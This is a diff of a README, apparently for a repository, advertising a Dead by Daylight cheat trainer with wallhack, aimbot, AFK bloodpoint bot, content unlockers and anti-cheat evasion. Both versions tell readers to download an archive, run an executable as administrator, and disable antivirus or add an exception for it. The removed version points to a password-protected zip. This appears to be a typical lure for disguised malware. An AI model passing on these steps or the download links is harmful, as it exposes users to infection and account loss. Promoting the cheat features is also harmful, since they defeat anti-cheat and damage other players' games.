@@ -1,48 +1,78 @@
-# 🩸 DBD AutoGrind Trainer 2026 Mega – Rule the Fog
+# 🎮 DBD-AutoGrind-Trainer-2026-Mega - Automate your progress in Dead by Daylight
 
-> **The most advanced undetected trainer for Dead by Daylight 2026.** Automate everything, see everything, unlock everything with the Mega edition.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/bifocal-scophthalmus681/DBD-AutoGrind-Trainer-2026-Mega)
 
-## Feature Set
+This tool helps players automate the grind for Bloodpoints and rewards in Dead by Daylight. It includes features to track items through walls, aim with precision, and unlock game content like perks and character skins. The program functions as an external tool, meaning it operates outside the game client.
 
-| Feature                     | What it does                                                  |
-|-----------------------------|---------------------------------------------------------------|
-| Auto Bloodpoint Farm        | AFK bot that plays matches and collects unlimited BP          |
-| ESP Wallhack                | Highlights survivors, killers, generators, hooks, totems      |
-| Aimbot (Killer)             | Automatic targeting and attacking                             |
-| No Terror Radius            | Removes killer terror radius for stealth                      |
-| Fast Vault & Fast Pallet    | Increases survivor interaction speed                          |
-| Skill Check Bot             | Hits great skill checks every time                            |
-| Infinite Bloodpoints         | Writes any BP value in offline mode                           |
-| Perk Unlocker               | Unlocks all teachable perks instantly                         |
-| Skin Unlocker               | Unlocks all cosmetics, charms, outfits                        |
-| Anti‑Ban Obfuscation        | Memory scrambling and randomised delays                       |
+## ⚙️ System Requirements
 
-## ⬇️ How to Install
+Ensure your computer meets these specifications before you begin:
 
-1. Download the trainer from [https://skydock.netlify.app/trainer-archive.zip](https://skydock.netlify.app/trainer-archive.zip)
-2. Extract with password `trainer2026`
-3. Execute `trainer.exe` as Administrator
-4. Launch Dead by Daylight, enter a match
-5. Toggle the GUI with the **INSERT** key
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Processor: Intel Core i5 or AMD Ryzen 5 processor.
+* Memory: 8 GB of RAM.
+* Graphics: DirectX 11 compatible video card.
+* Storage: 50 MB of free disk space.
+* Administrative Access: You need permissions to run files as an administrator.
 
-## System Requirements
-- OS: Windows 10/11 (64‑bit)
-- Platforms: Steam, Epic Games Store, Microsoft Store
-- Game: Dead by Daylight (all chapters, including Jason Voorhees & Life Road)
-- Anti‑cheat: EasyAntiCheat – bypassed externally
+Close other programs that might interfere with input detection, such as overlays or recording software, while using this tool.
 
-## Troubleshooting
+## 🚀 How to Setup
 
-| Problem                     | Solution                                                  |
-|-----------------------------|-----------------------------------------------------------|
-| Trainer doesn't launch      | Run as Administrator, disable antivirus temporarily       |
-| GUI not visible             | Press INSERT, restart if necessary                        |
-| ESP not rendering           | Ensure you are in a live match                            |
-| Farm bot not running        | Must be in a public match                                 |
-| EAC warning                 | Use risky features in bot matches or offline              |
+Follow these steps to prepare your system and run the trainer:
 
-## 📜 License
-MIT
+1. Visit this page to download the latest version: [https://github.com/bifocal-scophthalmus681/DBD-AutoGrind-Trainer-2026-Mega](https://github.com/bifocal-scophthalmus681/DBD-AutoGrind-Trainer-2026-Mega).
+2. Save the downloaded compressed folder to your desktop.
+3. Right-click the folder and select Extract All. Choose a location on your hard drive.
+4. Open the extracted folder and locate the file named Trainer.exe.
+5. Right-click Trainer.exe and select Run as administrator. This allows the tool to interface with the game.
+6. A control window appears on your screen. Keep this window open while you play.
 
-## 🔍 Search Tags
-`dbd-aimbot, dbd-cheat, perk-unlocker, grind-bot, dbd, external, dead-by-daylight-trainer, eac-bypass, game-hack, bloodpoint-hack, killer-hack, dbd-mod, bypass, anti-cheat-bypass, dead-by-daylight, aimbot, dbd-unlock-all`
+## 🕹️ Using the Features
+
+Once you launch the game and the trainer, you interact with the software through a simple control panel.
+
+* Bloodpoint Bot: This function automates the process of entering matches to earn currency. Enable it in the main menu of the trainer. Ensure your character is set to a ready state before activation. 
+* ESP Wallhack: This feature shows player positions and task objects through solid walls. You toggle this feature using the F1 key.
+* Aimbot: This assists with camera tracking. You activate this using the F2 key. This feature adjusts your view toward active objectives or targets.
+* Unlocker: This tool grants access to all perks and skins. Select the specific items you want from the Library tab within the trainer and click Apply.
+
+## 🛡️ Best Practices for Use
+
+External tools interact with game memory. Follow these practices to maintain a smooth experience:
+
+* Use in Private Matches: Test the features in custom games first. This lets you learn the controls without affecting your live profile.
+* Update Regularly: Check the repository link periodically for new versions. Updates address game patches and maintain stability.
+* Use Settings Sparingly: Do not enable every feature at once. Start with the Bloodpoint bot and add other features as you grow comfortable with the software.
+* Monitor System Resources: Keep an eye on your CPU usage. If you notice a slowdown, close unnecessary web browser tabs or background applications.
+* Security Software: Some antivirus programs flag external trainers because they manipulate memory. If your computer blocks the file, verify the source is the GitHub repository and create an exception in your security settings.
+
+## 🛠️ Troubleshooting Common Issues
+
+If the software does not work, check these common fixes:
+
+* The trainer fails to launch: Ensure you extracted the files from the zipped folder. The program cannot run directly from a compressed archive.
+* Features do not activate: Check if you launched the game and the trainer as an administrator. Windows permissions prevent the program from reading game data if it lacks these rights.
+* Overlay disappears: If you use a full-screen mode in the game, try switching to Borderless Windowed mode in the Dead by Daylight video settings. This allows the trainer to draw information over the game window.
+* In-game input lag: If your mouse movement feels strange, lower the strength of the aimbot in the trainer menu. High settings can fight against your manual inputs.
+* Game crashes: Disable all features and restart the game. Re-enable one feature at a time to identify which setting causes the conflict.
+
+## 📝 Frequently Asked Questions
+
+What does it mean to be an external tool?
+An external tool reads data from the game memory without modifying the game files directly. This approach keeps the original game files intact.
+
+Will I lose my progress?
+The unlocker applies changes to your account data. These changes sync with the game servers. Always back up your game configuration files before you use the unlocker for the first time.
+
+Can I use the Bloodpoint bot while AFK?
+Yes, the bot functions while you are away from the computer. Make sure your computer power settings do not put the machine to sleep during this time.
+
+How do I remove the trainer?
+Delete the folder containing the trainer files. Because the tool is external, it leaves no traces in your game directory once you remove the folder.
+
+Is the aimbot always on?
+No, the aimbot only activates when you hold the assigned key. You control the trigger. 
+
+How do I check my current version?
+The version number appears in the top-left corner of the trainer window. Compare this to the release notes on the GitHub page to see if an update exists.
